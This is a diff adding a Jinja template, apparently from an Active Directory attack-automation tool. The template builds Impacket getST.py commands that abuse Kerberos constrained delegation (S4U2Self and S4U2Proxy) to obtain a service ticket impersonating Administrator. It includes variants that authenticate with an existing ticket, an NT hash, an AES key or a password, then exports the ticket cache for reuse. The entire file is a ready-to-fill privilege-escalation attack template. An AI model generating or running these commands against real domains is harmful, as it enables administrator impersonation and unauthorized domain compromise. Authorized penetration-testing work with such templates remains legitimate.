@@ -1,0 +1,15 @@
+# Ask a TGS for {{requested_spn}} and impersonate it to Administrator (S4U2Self + S4U2Proxy)
+{% set do_u2u = ' -u2u' if do_u2u else '' %}
+{% set do_additional = ' -additional-ticket "$ticket"' if do_additional else '' %}
+{% if parent.krb_auth %}
+getST.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -dc-ip {{dc_ip}} -impersonate Administrator -spn '{{requested_spn}}'{{do_u2u}}{{do_additional}}
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+getST.py '{{fqdn}}/{{parent.obj.name}}' -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}} -impersonate Administrator -spn '{{requested_spn}}'{{do_u2u}}{{do_additional}}
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+getST.py '{{fqdn}}/{{parent.obj.name}}' -no-pass -aesKey {{parent.secret|red}} -dc-ip {{dc_ip}} -impersonate Administrator -spn '{{requested_spn}}'{{do_u2u}}{{do_additional}}
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+getST.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -dc-ip {{dc_ip}} -impersonate Administrator -spn '{{requested_spn}}'{{do_u2u}}{{do_additional}}
+{%- endif %}
+
+export KRB5CCNAME='Administrator@{{requested_spn|replace('/', '_')}}@{{fqdn}}.ccache'
+{{- set_attr(parent, 'krb_auth', True) }}
